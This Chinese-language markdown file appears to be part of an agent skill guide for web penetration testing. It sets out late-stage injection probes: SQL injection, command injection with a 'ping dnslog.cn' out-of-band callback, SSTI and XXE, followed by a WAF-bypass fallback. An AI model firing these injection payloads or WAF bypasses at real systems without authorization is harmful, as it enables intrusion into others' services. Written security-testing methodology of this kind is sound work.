# 高危探测详细步骤 (Phase 3.8)

> 从 SKILL.md Phase 3.8 迁出。进入 Phase 3.8 时加载。
> **进入前置（2026-09 重排）**：deep 账本 `evidence/_deep_results.jsonl` 已立（深水层已走完）——
> 本阶段是收尾重炮，前面的安静面（联动/深水/越权/admin 面）测完才轮到这里。
> WARNING: 这些操作会触发 WAF 规则。有 WAF 全程 SAFE MODE 限速；最后才打，触发也无碍。
>
> **2026-09 重排**（低 WAF 触发项前移）:
> - 垂直越权 / Swagger 文档 / Admin 敏感路径 → `admin-surface.md`（deep 阶段后半）
> - 导出接口越权 → `breakthrough-shortlist.md` §二（linkage 阶段）
> 本文件只保留**高 WAF 触发**的注入/对抗类。

---

## 核心模式：遍历+记录，互不阻塞

```
Phase 3.8 执行模式（非"首次403=整体停止"）:
  每个项目独立测试 → WAF 拦截=记入 blocked 清单 → 继续测下一项
  → blocked 清单写入 findings/_interim-phase3.8-blocked.md
  → 全部测完后再统一决定是否对 blocked 项做 WAF 绕过
```

---

## Step 1 — SQL Injection（手工单点，不批量）

```
→ 仅在 Phase 3 中已识别为 "可能的数据库输入" 的参数上测试
→ 测试: id=3-1 (数字型), keyword=test' (字符型), SLEEP(2)
→ 403=记入 blocked: "SQLi WAF blocked on param={param_name}"
→ 异常响应=记录发现
→ 正常返回=未发现 → 继续下一个参数
→ 绝不在 WAF 保护目标上使用 SQLmap
```

---

## Step 2 — Command Injection

```
→ 仅在名为 cmd/command/exec/shell/ping/host 的参数上测试
→ 测试: ; sleep 2 (盲打), ; ping -c 2 dnslog.cn (OOB)
→ 403=记入 blocked: "CMD注入 WAF blocked on param={param_name}"
→ OOB回调成功=记录发现
→ 正常返回=未发现
```

---

## Step 3 — SSTI / XXE Payload Tests

```
→ SSTI: ${7*7}（预检，不触发 WAF）→ 计算=发现 | 原文=未发现
→ XXE: <!DOCTYPE> OOB → 回调=发现 | 被拦截=记入 blocked
→ 403=记入 blocked → 继续下一个测试
```

> SSRF 不在本阶段：主测收敛至 `hunt_ssrf/SKILL.md`（🟡 linkage，URL 参数优先 +
> OOB 确认 + 云元数据 + 绕过变体 + 盲打三连），此处不再重复探测。
> 垂直越权/admin 面 → `admin-surface.md`（deep）；导出越权 → `breakthrough-shortlist.md`（linkage）。

---

## Phase 3.8 后处理

```
全部项目测试完成 → blocked 清单写入 findings/_interim-phase3.8-blocked.md:

blocked 清单非空:
  → 目标价值 HIGH → LAST RESORT: 对 blocked 项统一尝试 WAF 绕过
    （仅对被拦截的具体项目，不是整个 Phase 3.8 重做）
  → 目标价值 LOW → 接受损失，进入 Phase 5 报告
  → 绕过尝试结果写入 blocked 清单的同文件

blocked 清单为空:
  → 所有项目正常完成 → 合并 Phase 0-3 发现 → 进入 Phase 5 报告
```
